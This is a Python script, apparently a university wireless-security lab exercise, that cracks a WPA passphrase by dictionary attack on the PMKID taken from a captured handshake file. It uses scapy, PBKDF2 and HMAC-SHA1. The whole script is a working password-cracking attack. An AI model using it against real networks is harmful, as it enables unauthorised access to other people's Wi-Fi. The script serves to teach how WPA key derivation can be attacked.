#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derivate WPA keys from Passphrase and 4-way handshake info

Calcule la PMKID en réalisant une attaque par dictionnaire sur la passphrase afin de trouver la PMK. Si la PMKID calculée
est égale à la PMKID trouvée dans le fichier, la passphrase utilisée est correcte
"""

__author__ = "Abraham Rubinstein et Yann Lederrey"
__modified__ = "Alexandra Cerottini et Nicolas Ogi"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

from binascii import a2b_hex, b2a_hex

from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
from scapy.layers.dot11 import Dot11, Dot11Beacon

from pbkdf2 import *


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


# read capture file -- it contains beacon, authentication, association, handshake and data
wpa = rdpcap("PMKID_handshake.pcap")

# wpa[144] is a packet of the capture that contains a beacon frame sent by the AP, so we can get its SSID
ssid = wpa[144][Dot11Beacon].info.decode()

# wpa[145] represents the first message of a 4-way handshake and contains the AP mac address
APmac = a2b_hex(wpa[145][Dot11].addr2.replace(':', ''))
# wpa[145] represents the first message of a 4-way handshake and contains the client mac address
Clientmac = a2b_hex(wpa[145][Dot11].addr1.replace(':', ''))

# wpa[145] represents the first message of a 4-way handshake, we extract the 16 last bytes of the wpa_key in scapy
# to get the PMKID
pmkid_to_test = wpa[145][WPA_key].wpa_key[-16:]

print("\n\nValues used to find the passphrase")
print("============================")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("Client Mac: ", b2a_hex(Clientmac), "\n")
print("PMKID: ", pmkid_to_test.hex(), "\n")

# iterate on the wordlist to find the correct passphrase
f = open('./wordlist.txt', 'r')
for passPhrase in f.read().splitlines():
    passPhrase = str.encode(passPhrase)
    encoded_ssid = str.encode(ssid)

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase, encoded_ssid, 4096, 32)

    # calculate the PMKID with the current PMK
    pmkid = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)

    # the 4 last bytes must be removed of the PMKID because SHA-1 returned 20 bytes but the PMKID is only 16 bytes long
    if pmkid.hexdigest()[:-8] == pmkid_to_test.hex():
        print("Passphrase found ! \"" + passPhrase.decode() + "\"")
        break
